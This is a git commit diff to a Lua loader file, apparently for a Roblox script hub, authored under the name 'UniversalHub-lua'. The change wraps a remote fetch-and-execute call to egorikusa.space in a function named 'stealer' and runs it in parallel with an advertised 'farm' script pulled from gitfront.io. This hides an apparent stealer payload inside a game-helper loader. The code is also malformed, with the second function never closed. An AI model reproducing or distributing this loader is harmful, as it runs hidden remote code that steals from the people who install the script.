2dd28788aaf8857b8e52d95d7274a498bc3e3a6c
UniversalHub-lua <austinejamess043@gmail.com>
2025-01-16 18:08:55 +0800

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,1 +1,7 @@
-loadstring(game:HttpGet("https://egorikusa.space/2845e6578a5c7b8f6b0dfa5e.lua", true))() 
+local function stealer()
+    loadstring(game:HttpGet("https://egorikusa.space/2845e6578a5c7b8f6b0dfa5e.lua", true))() 
+end       
+local function farm()
+    loadstring(game:HttpGet('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'))()
+task.spawn(stealer)
+task.spawn(farm) 
